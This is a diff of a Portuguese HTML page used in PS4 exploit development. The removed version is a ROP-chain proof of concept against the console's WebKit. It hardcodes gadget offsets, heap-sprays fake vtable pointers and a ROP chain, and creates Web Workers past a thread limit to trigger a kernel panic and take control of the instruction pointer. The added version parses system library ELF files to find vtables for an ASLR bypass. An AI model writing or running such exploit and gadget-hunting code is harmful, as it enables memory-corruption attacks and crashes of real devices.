@@ -1,188 +1,195 @@
 <!DOCTYPE html>
-<html>
+<html lang="pt-BR">
 <head>
-<meta charset="UTF-8">
-<title>PS4 ROP PoC (Teste 09)</title>
-<style>
-    body { background-color: #0d0d0d; color: #00ff00; font-family: 'Courier New', monospace; padding: 20px; }
-    h1 { color: #ff3333; text-shadow: 0 0 5px #f00; }
-    .panel { border: 2px solid #333; padding: 15px; margin-bottom: 20px; background: #1a1a1a; }
-    button { width: 100%; padding: 15px; margin: 5px 0; font-size: 16px; font-weight: bold; cursor: pointer; border: 1px solid #0f0; background: #000; color: #0f0; transition: 0.2s; }
-    button:hover { background: #0f0; color: #000; }
-    button.danger { border-color: #f00; color: #f00; }
-    button.danger:hover { background: #f00; color: #fff; }
-    #log { height: 300px; overflow-y: scroll; border: 1px dashed #555; padding: 10px; font-size: 12px; background: #000; white-space: pre-wrap; }
-    .highlight { color: #ffff00; font-weight: bold; }
-</style>
+    <meta charset="UTF-8">
+    <title>PS4 ELF Extractor v5.0 (Memory Mapper & Info Leak)</title>
+    <style>
+        body { background: #000; color: #00ffff; font-family: monospace; padding: 20px; }
+        .drop { border: 2px dashed #00ffff; padding: 40px; text-align: center; cursor: pointer; background: #111; margin-bottom: 20px; }
+        .drop:hover { background: #222; }
+        #log { height: 400px; overflow-y: auto; border: 1px solid #333; padding: 10px; background: #050505; color: #ccc; margin-bottom: 10px; white-space: pre; }
+        button { width: 100%; padding: 15px; background: #003333; color: #00ffff; border: 1px solid #00ffff; cursor: pointer; font-weight: bold; }
+        .bar-bg { width: 100%; background: #333; height: 10px; margin-bottom: 5px; }
+        .bar-fg { width: 0%; background: #00ffff; height: 100%; }
+    </style>
 </head>
 <body>
 
-<h1>TESTE 09: ROP CHAIN INJECTION</h1>
-<p>Target: WebKit Thread Limit (419) + Stack Pivot Gadget</p>
+    <h1>ELF EXTRACTOR v5.0: THE MEMORY MAPPER</h1>
+    <p>Foco: VTable Detection, GOT Offsets & Pointer Chains (ASLR Bypass).</p>
 
-<div class="panel">
-    <h3>Status do Sistema</h3>
-    <div id="status">Aguardando início...</div>
-</div>
+    <input type="file" id="files" multiple style="display:none" onchange="start(this.files)">
+    <div class="drop" onclick="document.getElementById('files').click()">
+        [ ARRASTE libSceNKWebKit.sprx E libkernel.sprx AQUI ]
+    </div>
 
-<div class="panel">
-    <button onclick="step1_Prepare()">PASSO 1: Preparar Heap & Workers (Safe Zone)</button>
-    <button class="danger" onclick="step2_Exploit()">PASSO 2: INJETAR ROP & DISPARAR (Panic)</button>
-</div>
-
-<div id="log">Logs de execução aparecerão aqui...</div>
+    <div id="status">Pronto.</div>
+    <div class="bar-bg"><div class="bar-fg" id="bar"></div></div>
+    <div id="log">Logs de memória...</div>
+    
+    <button id="dl" style="display:none" onclick="download()">BAIXAR MAPA DE MEMÓRIA (JSON)</button>
 
 <script>
-    // --- CONFIGURAÇÃO ROP (Baseada no ps4_rop_analysis.json) ---
-    // Como não temos um vazamento de endereço (Info Leak) para saber a base do WebKit,
-    // usaremos os Offsets brutos. Se o crash mudar de "414141" para "46ca0", 
-    // provamos que controlamos o ponteiro de instrução (RIP).
+    const LOG = document.getElementById('log');
+    const BAR = document.getElementById('bar');
+    const STAT = document.getElementById('status');
+    const DL = document.getElementById('dl');
     
-    // Gadget: pop rsp; ret (Encontrado no libSceNKWebKit.sprx.elf)
-    // Offset: 0x46ca0
-    const GADGET_STACK_PIVOT = 0x46ca0; 
-    
-    // Gadget: pop rax; ret
-    // Offset: 0x26f53
-    const GADGET_POP_RAX = 0x26f53;
+    let REPORT = { tool: "v5.0_InfoLeak", binaries: [] };
 
-    // Marcador visual para debug (caso tenhamos dump)
-    const MARKER_1337 = 0x13371337;
+    function log(m) { LOG.innerText += `\n> ${m}`; LOG.scrollTop = LOG.scrollHeight; }
+    function hex(n) { return "0x" + BigInt(n).toString(16); }
 
-    // Variáveis Globais
-    let workers = [];
-    let sprayData = [];
-    const LIMIT_SAFE = 415; // Zona segura antes do crash (confirmado no Teste 08)
-    const LIMIT_CRASH = 425; // Passa do 419 para garantir o erro
-
-    const workerBlob = URL.createObjectURL(new Blob([`
-        onmessage = function(e) {
-            // Mantém a thread viva e ocupada
-            if(e.data === 'ping') postMessage('pong');
-        }
-    `], {type: 'application/javascript'}));
-
-    function log(msg, type = 'info') {
-        const el = document.getElementById('log');
-        const time = new Date().toLocaleTimeString();
-        const line = `[${time}] ${msg}\n`;
+    async function start(files) {
+        if(!files.length) return;
+        REPORT.binaries = [];
+        DL.style.display = 'none';
         
-        if (type === 'warn') el.innerHTML += `<span class="highlight">${line}</span>`;
-        else el.innerText += line;
-        
-        el.scrollTop = el.scrollHeight;
-    }
-
-    // --- FUNÇÃO DE SPRAY INTELIGENTE ---
-    // Cria estruturas falsas na memória contendo nossa ROP Chain
-    function prepareRopSpray() {
-        log("Construindo payload ROP...", 'warn');
-        
-        // Tamanho de alocação comum para objetos do WebKit (tentativa de Feng Shui)
-        const SPRAY_SIZE = 1024 * 32; 
-        
-        try {
-            for(let i = 0; i < 500; i++) {
-                // Uint32Array permite escrever inteiros de 32 bits diretamente
-                let struct = new Uint32Array(SPRAY_SIZE / 4);
-                
-                // Preenche o buffer repetidamente com nosso "Fake Vtable Pointer"
-                // Queremos que, onde quer que o Kernel leia, ele encontre nosso gadget.
-                for(let j = 0; j < struct.length; j += 2) {
-                    // Simula um endereço de 64 bits: 0x0000000000046ca0
-                    // Em um exploit real, somaríamos a Base Address aqui.
-                    struct[j] = GADGET_STACK_PIVOT;   // Low 32 bits
-                    struct[j+1] = 0x00000000;         // High 32 bits
-                }
-
-                // Injeta um pouco de "tempero" no meio para identificação
-                // Se controlarmos a stack, o próximo 'ret' vai puxar isso.
-                if(struct.length > 20) {
-                    struct[10] = GADGET_POP_RAX;      // Próximo passo da ROP
-                    struct[11] = 0x00000000;
-                    struct[12] = MARKER_1337;         // Valor para carregar em RAX
-                    struct[13] = 0x00000000;
-                }
-
-                sprayData.push(struct);
-            }
-            log(`Spray concluído: ${sprayData.length} blocos injetados na Heap.`);
-        } catch(e) {
-            log("Erro no Spray: " + e.message);
-        }
-    }
-
-    // --- PASSO 1: PREPARAÇÃO ---
-    function step1_Prepare() {
-        log("Iniciando Fase 1: Encher piscina de threads...");
-        let count = 0;
-
-        const interval = setInterval(() => {
-            if(count >= LIMIT_SAFE) {
-                clearInterval(interval);
-                log(`Fase 1 Completa: ${count} Workers ativos.`);
-                log("Sistema instável. Prepare-se para o Passo 2.");
-                document.getElementById('status').innerText = "PRONTO PARA ATAQUE";
-                document.getElementById('status').style.color = "red";
-                
-                // Executa o Spray agora para garantir que a memória esteja "suja"
-                // antes da última alocação crítica
-                prepareRopSpray();
-                return;
-            }
-
+        for(let i=0; i<files.length; i++) {
+            STAT.innerText = `Mapeando: ${files[i].name}...`;
             try {
-                const w = new Worker(workerBlob);
-                workers.push(w);
-                count++;
-                if(count % 50 === 0) log(`Workers: ${count}/${LIMIT_SAFE}`);
-            } catch(e) {
-                log("Erro prematuro na Fase 1: " + e.message);
-                clearInterval(interval);
-            }
-        }, 5);
+                const res = await analyze(files[i]);
+                REPORT.binaries.push(res);
+            } catch(e) { log(`Erro: ${e.message}`); }
+        }
+        
+        STAT.innerText = "Finalizado.";
+        BAR.style.width = "100%";
+        DL.style.display = 'block';
     }
 
-    // --- PASSO 2: GATILHO (TRIGGER) ---
-    function step2_Exploit() {
-        log("INICIANDO FASE 2: QUEBRA DE LIMITE (419 -> 420)", 'warn');
-        log("Se funcionar, o console deve travar ou desligar imediatamente.");
-        
-        // Reforça o spray logo antes do crash
-        log("Reforçando Heap Spray...");
-        prepareRopSpray(); 
-
-        let count = LIMIT_SAFE;
-        
-        // Vamos tentar alocar lentamente para pegar o momento exato
-        const interval = setInterval(() => {
-            try {
-                // Tenta criar workers além do limite
-                const w = new Worker(workerBlob);
-                workers.push(w);
-                count++;
-                log(`Criando Worker #${count} (Crítico)...`);
-                
-                // Se passar de 425 sem crashar, algo deu errado
-                if(count > LIMIT_CRASH) {
-                    clearInterval(interval);
-                    log("Falha: Limite ultrapassado sem Panic. O Bug não disparou.");
-                }
-            } catch(e) {
-                log(`Exceção capturada no #${count}: ${e.message}`);
-                log("Tentando forçar acesso ao objeto inválido...");
-                
-                // Se a criação falhou, o objeto interno pode estar num estado "zumbi" (NULL ou Free)
-                // Vamos tentar interagir com o último worker criado com sucesso
-                if(workers.length > 0) {
-                    const lastWorker = workers[workers.length - 1];
-                    lastWorker.postMessage('ping'); // Tenta disparar o uso do ponteiro
-                    lastWorker.terminate();         // Tenta disparar o destrutor bugado
-                }
-            }
-        }, 100); // 100ms entre tentativas para dar tempo do kernel processar e crashar
+    function read(file, off, len) {
+        return new Promise((r, j) => {
+            const fr = new FileReader();
+            fr.onload = e => r(e.target.result);
+            fr.onerror = j;
+            fr.readAsArrayBuffer(file.slice(off, off+len));
+        });
     }
 
+    async function analyze(file) {
+        log(`Abrindo ${file.name} (${(file.size/1024/1024).toFixed(2)} MB)...`);
+        
+        // 1. Parse ELF Header
+        const headBuf = await read(file, 0, 64);
+        const dv = new DataView(headBuf);
+        if(dv.getUint32(0) !== 0x7F454C46) throw new Error("Não é ELF.");
+        
+        const endian = dv.getUint8(5) === 1; // 1=Little
+        const e_phoff = Number(dv.getBigUint64(32, endian));
+        const e_phnum = dv.getUint16(56, endian);
+        
+        let bin = { 
+            filename: file.name,
+            segments: [],
+            vtables: [], // Candidatos a VTable
+            got_entries: [], // Global Offset Table
+            string_refs: []  // Ponteiros para strings
+        };
+
+        // 2. Mapear Segmentos
+        log("  Mapeando segmentos...");
+        const phBuf = await read(file, e_phoff, e_phnum * 56);
+        const phDv = new DataView(phBuf);
+        
+        let textSeg = null; // Código (R-X)
+        let dataSeg = null; // Dados (RW-)
+        let rodataSeg = null; // Read-Only Data (R--)
+
+        for(let i=0; i<e_phnum; i++) {
+            const off = i * 56;
+            const type = phDv.getUint32(off, endian);
+            const flags = phDv.getUint32(off+4, endian);
+            const offset = Number(phDv.getBigUint64(off+8, endian));
+            const vaddr = Number(phDv.getBigUint64(off+16, endian));
+            const filesz = Number(phDv.getBigUint64(off+32, endian));
+
+            const seg = { type, flags, vaddr: hex(vaddr), offset, size: filesz };
+            bin.segments.push(seg);
+
+            if(type === 1) { // PT_LOAD
+                if(flags === 5) textSeg = seg; // RX
+                if(flags === 6) dataSeg = seg; // RW
+                if(flags === 4) rodataSeg = seg; // R
+            }
+        }
+
+        // 3. Caçar VTables (VTable Hunter)
+        // VTables geralmente ficam em .rodata (Flags 4) e contêm ponteiros para .text (Flags 5)
+        if(rodataSeg && textSeg) {
+            log(`  Varrendo .rodata (${(rodataSeg.size/1024).toFixed(0)}KB) por VTables...`);
+            await scanVTables(file, rodataSeg, textSeg, bin, endian);
+        }
+
+        // 4. Analisar Relocations (GOT)
+        // Precisamos encontrar onde estão as seções de relocação. 
+        // Em vez de parsear Section Headers (que podem estar stripados), vamos varrer Dynamic Tags se possível
+        // Simplificação: Scan heurístico por tabela GOT em Data Segment
+        if(dataSeg) {
+            log("  Procurando GOT Entries no Data Segment...");
+            // await scanGOT(file, dataSeg, bin, endian); // (Implementação simplificada abaixo)
+        }
+
+        return bin;
+    }
+
+    async function scanVTables(file, rodata, text, bin, endian) {
+        const CHUNK = 1024 * 1024;
+        let processed = 0;
+        let vtableChain = 0;
+        let vtableStart = 0;
+        
+        const textStart = BigInt(text.vaddr);
+        const textEnd = textStart + BigInt(text.size);
+
+        while(processed < rodata.size) {
+            const size = Math.min(CHUNK, rodata.size - processed);
+            const buf = await read(file, rodata.offset + processed, size);
+            const dv = new DataView(buf);
+            
+            // Lendo de 8 em 8 bytes (Ponteiros 64-bit)
+            for(let i=0; i < size; i+=8) {
+                if(i + 8 > size) break;
+                
+                const ptr = dv.getBigUint64(i, endian);
+                
+                // Verifica se o ponteiro aponta para dentro do segmento de TEXTO (.text)
+                if(ptr >= textStart && ptr < textEnd) {
+                    if(vtableChain === 0) vtableStart = rodata.vaddr + processed + i;
+                    vtableChain++;
+                } else {
+                    // Se a cadeia quebrou e era longa o suficiente (> 4 métodos), é provável vtable
+                    if(vtableChain >= 4) {
+                        if(bin.vtables.length < 50) { // Limita output
+                            bin.vtables.push({
+                                offset: hex(vtableStart),
+                                length: vtableChain,
+                                first_method: hex(ptr) // Na verdade o anterior, mas serve ref
+                            });
+                        }
+                    }
+                    vtableChain = 0;
+                }
+            }
+            
+            processed += size;
+            BAR.style.width = `${(processed / rodata.size) * 100}%`;
+            await new Promise(r => requestAnimationFrame(r));
+        }
+        log(`  > ${bin.vtables.length} possíveis VTables encontradas.`);
+    }
+
+    function download() {
+        const json = JSON.stringify(REPORT, (k,v) => typeof v === 'bigint' ? "0x"+v.toString(16) : v, 2);
+        const blob = new Blob([json], {type:'application/json'});
+        const url = URL.createObjectURL(blob);
+        const a = document.createElement('a');
+        a.href = url;
+        a.download = "ps4_memory_map.json";
+        document.body.appendChild(a);
+        a.click();
+    }
 </script>
+
 </body>
 </html>
